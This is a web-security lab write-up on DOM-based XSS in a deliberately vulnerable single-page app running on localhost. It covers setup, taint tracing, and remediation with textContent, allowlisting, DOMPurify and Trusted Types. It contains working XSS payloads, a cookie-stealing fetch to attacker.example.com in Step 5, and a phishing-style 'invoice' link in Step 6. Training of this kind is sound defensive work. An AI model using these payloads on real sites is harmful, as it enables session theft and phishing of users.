# Lab 01 — DOM XSS in a SPA Router

## Objective

Exploit a DOM-based XSS vulnerability in a single-page application that uses `location.hash` as a client-side routing mechanism and passes the route value to `innerHTML` without sanitization.

---

## Prerequisites

- Docker installed (or Node.js 18+)
- Basic understanding of browser DevTools
- Familiarity with `location.hash` and DOM sinks

---

## Setup

### Option A: Docker

```bash
docker run -d -p 8080:8080 --name lab01-dom-xss \
  -e NODE_ENV=development \
  node:18-alpine sh -c "
    mkdir /app && cat > /app/server.js << 'EOF'
const http = require('http');
const fs = require('fs');
const path = require('path');

const HTML = \`<!DOCTYPE html>
<html>
<head><title>SPA Demo</title></head>
<body>
<nav>
  <a href='#home'>Home</a> |
  <a href='#about'>About</a> |
  <a href='#contact'>Contact</a>
</nav>
<div id='content'>Loading...</div>
<script>
const pages = {
  home: '<h1>Welcome</h1><p>This is the home page.</p>',
  about: '<h1>About Us</h1><p>A demo application.</p>',
  contact: '<h1>Contact</h1><p>Email us at demo@example.com</p>'
};

function renderPage() {
  const route = decodeURIComponent(location.hash.slice(1));
  const content = pages[route] || '<h1>Not Found</h1><p>Route: ' + route + '</p>';
  document.getElementById('content').innerHTML = content;
}

window.addEventListener('hashchange', renderPage);
renderPage();
</script>
</body>
</html>\`;

http.createServer((req, res) => {
  res.writeHead(200, {'Content-Type': 'text/html'});
  res.end(HTML);
}).listen(8080);
console.log('Lab running on http://localhost:8080');
EOF
    node /app/server.js
  "
```

### Option B: Local Node.js

```bash
mkdir lab01 && cd lab01
cat > server.js << 'HEREDOC'
const http = require('http');

const HTML = `<!DOCTYPE html>
<html>
<head><title>SPA Demo</title></head>
<body>
<nav>
  <a href='#home'>Home</a> |
  <a href='#about'>About</a> |
  <a href='#contact'>Contact</a>
</nav>
<div id='content'>Loading...</div>
<script>
const pages = {
  home: '<h1>Welcome</h1><p>This is the home page.</p>',
  about: '<h1>About Us</h1><p>A demo application.</p>',
  contact: '<h1>Contact</h1><p>Email us at demo@example.com</p>'
};

function renderPage() {
  const route = decodeURIComponent(location.hash.slice(1));
  const content = pages[route] || '<h1>Not Found</h1><p>Route: ' + route + '</p>';
  document.getElementById('content').innerHTML = content;
}

window.addEventListener('hashchange', renderPage);
renderPage();
</script>
</body>
</html>`;

http.createServer((req, res) => {
  res.writeHead(200, {'Content-Type': 'text/html'});
  res.end(HTML);
}).listen(8080, () => console.log('Lab running on http://localhost:8080'));
HEREDOC

node server.js
```

Open `http://localhost:8080` in your browser.

---

## Step-by-Step Walkthrough

### Step 1: Understand the Normal Application

Navigate to:
- `http://localhost:8080/#home`
- `http://localhost:8080/#about`
- `http://localhost:8080/#contact`

Observe that the content area updates based on the hash fragment.

### Step 2: Find the Taint Flow

Open DevTools → Sources. Locate the inline `<script>`. Trace the data flow:

```
location.hash.slice(1)
    ↓ decodeURIComponent()
    ↓ route variable
    ↓ pages[route] or string concatenation
    ↓ document.getElementById('content').innerHTML   ← SINK
```

The fragment is URL-decoded and assigned to `innerHTML`. There is no sanitization.

### Step 3: Test for Reflection

Visit: `http://localhost:8080/#<b>test</b>`

If the word "test" appears in bold in the content area, HTML is being rendered — confirming the sink.

### Step 4: Craft the Initial Payload

The simplest HTML-executing payload:

```
http://localhost:8080/#<img src=x onerror=alert(document.domain)>
```

> Note: URL fragments are not sent to the server, so no WAF or server-side filter applies here.

### Step 5: Escalate — Cookie Exfiltration

Replace `alert(document.domain)` with a credential theft payload:

```
http://localhost:8080/#<img src=x onerror=fetch('http://attacker.example.com/c?d='+document.cookie)>
```

URL-encode the fragment if needed:

```
http://localhost:8080/#%3Cimg%20src%3Dx%20onerror%3Dfetch('http%3A%2F%2Fattacker.example.com%2Fc%3Fd%3D'%2Bdocument.cookie)%3E
```

### Step 6: Chain with Social Engineering

Construct a short URL or embed the exploit link in an email:

```html
<a href="http://localhost:8080/#<img src=x onerror=alert(1)>">Click here to view your invoice</a>
```

---

## Solution

**Root cause:** `location.hash.slice(1)` (a source) flows through `decodeURIComponent()` and into `document.getElementById('content').innerHTML` (a sink) without sanitization.

**Working exploit URL:**

```
http://localhost:8080/#<img src=x onerror=alert(document.domain)>
```

---

## Remediation

**Option 1: Use `textContent` instead of `innerHTML`** (when the content is text only)

```javascript
document.getElementById('content').textContent = route;
```

**Option 2: Use an allowlist for the routing logic**

```javascript
function renderPage() {
  const route = location.hash.slice(1);
  // Only allow known route names — never pass raw input to innerHTML
  const content = pages[route] ?? '<h1>Not Found</h1>';
  document.getElementById('content').innerHTML = content;
  // Safe because pages[route] is developer-controlled, not user-controlled
}
```

**Option 3: Apply DOMPurify before assigning to innerHTML**

```javascript
import DOMPurify from 'dompurify';
document.getElementById('content').innerHTML = DOMPurify.sanitize(content);
```

**Option 4: Trusted Types (strongest)**

```javascript
if (window.trustedTypes) {
  const policy = trustedTypes.createPolicy('router', {
    createHTML: (s) => DOMPurify.sanitize(s, {RETURN_TRUSTED_TYPE: true})
  });
  document.getElementById('content').innerHTML = policy.createHTML(content);
}
```

---

## References

- [PortSwigger DOM XSS Lab](https://portswigger.net/web-security/cross-site-scripting/dom-based)
- [OWASP DOM XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS)
- [Trusted Types MDN](https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API)
